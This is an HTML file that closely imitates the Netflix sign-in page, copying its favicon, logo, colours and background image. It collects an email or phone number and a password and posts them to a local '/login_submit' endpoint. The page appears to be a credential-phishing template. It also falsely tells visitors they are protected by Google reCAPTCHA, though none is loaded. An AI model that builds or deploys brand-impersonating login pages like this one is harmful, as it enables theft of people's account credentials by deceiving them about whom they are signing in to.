<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <!-- Favicon -->
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts - Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Netflix background with your exact image */
        .netflix-bg {
            background-image: 
                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/f562aaf4-5dbb-4603-a32b-6ef6c2230136/dh0w8qv-9d8ee6b2-b41a-4681-ab9b-8a227560dc75.jpg/v1/fill/w_1192,h_670,q_70,strp/the_netflix_login_background__canada__2024___by_logofeveryt_dh0w8qv-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvZjU2MmFhZjQtNWRiYi00NjAzLWEzMmItNmVmNmMyMjMwMTM2XC9kaDB3OHF2LTlkOGVlNmIyLWI0MWEtNDY4MS1hYjliLThhMjI3NTYwZGM3NS5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.LOYKSxIDqfPwWHR0SSJ-ugGQ6bECF0yO6Cmc0F26CQs');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            min-height: 100vh;
        }

        /* Form container styling */
        .form-container {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px;
            max-width: 450px;
        }

        /* Netflix input fields */
        .netflix-input {
            background-color: #333;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 15px 20px;
            width: 100%;
            margin-bottom: 16px;
        }

        .netflix-input:focus {
            outline: none;
            background-color: #454545;
        }

        /* Netflix button */
        .netflix-button {
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 16px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-top: 24px;
        }

        .netflix-button:hover {
            background-color: #f6121d;
        }

        /* Netflix logo styling */
        .netflix-logo {
            color: #e50914;
            font-family: Arial, sans-serif;
            font-weight: 900;
            font-size: 45px;
            line-height: 1;
            text-shadow: 0 1px 2px rgba(0,0,0,0.45);
            letter-spacing: -1px;
        }

        /* OR divider */
        .divider {
            display: flex;
            align-items: center;
            color: #737373;
            font-size: 13px;
            margin: 20px 0;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #737373;
            margin: 0 10px;
        }
    </style>
</head>
<body class="netflix-bg flex items-center justify-center">
    <!-- Netflix Logo -->
    <header class="absolute top-0 left-0 w-full p-8 z-20">
        <div class="netflix-logo">NETFLIX</div>
    </header>

    <!-- Login Form Container -->
    <div class="form-container">
        <h1 class="text-white text-3xl font-bold mb-7 text-center">Sign In</h1>

        <form action="/login_submit" method="POST">
            <!-- Email or Phone Number Input -->
            <div class="mb-4">
                <input
                    type="text"
                    id="email"
                    name="email"
                    placeholder="Email or mobile number"
                    class="netflix-input"
                    required
                    autocomplete="username"
                >
            </div>

            <!-- Password Input -->
            <div class="mb-4">
                <input
                    type="password"
                    id="password"
                    name="password"
                    placeholder="Password"
                    class="netflix-input"
                    required
                    autocomplete="current-password"
                >
            </div>

            <!-- Sign In Button -->
            <button type="submit" class="netflix-button">
                Sign In
            </button>

            <!-- Additional options -->
            <div class="flex justify-between items-center mt-3 text-sm">
                <div class="flex items-center">
                    <input type="checkbox" id="remember" class="h-4 w-4">
                    <label for="remember" class="text-gray-300 ml-2">Remember me</label>
                </div>
                <a href="#" class="text-gray-300 hover:underline">Forgot password?</a>
            </div>

            <!-- OR divider -->
            <div class="divider">OR</div>

            <!-- Sign-in code option -->
            <div class="text-center mb-6">
                <a href="#" class="text-gray-300 hover:underline">Use a sign-in code</a>
            </div>

            <!-- Sign Up Link -->
            <div class="text-gray-500 text-center mt-8">
                New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.
            </div>

            <!-- reCAPTCHA text -->
            <div class="text-gray-500 text-xs mt-4">
                This page is protected by Google reCAPTCHA to ensure you're not a bot.
            </div>
        </form>
    </div>
</body>
</html>
